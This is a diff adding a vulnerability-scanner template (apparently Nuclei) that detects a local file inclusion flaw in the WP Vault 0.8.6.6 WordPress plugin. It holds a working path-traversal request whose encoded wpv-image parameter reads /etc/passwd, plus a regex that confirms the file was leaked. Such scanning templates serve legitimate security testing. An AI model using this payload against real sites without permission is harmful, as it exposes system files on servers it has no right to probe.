@@ -1,0 +1,19 @@
+id: wp-vault-local-file-inclusion
+info:
+  author: 0x_Akoko
+  name: "WP Vault 0.8.6.6 \u2013 Plugin WordPress \u2013 Local File Inclusion"
+  reference: https://www.exploit-db.com/exploits/40850
+  severity: high
+  tags: wp,lfi
+requests:
+- matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
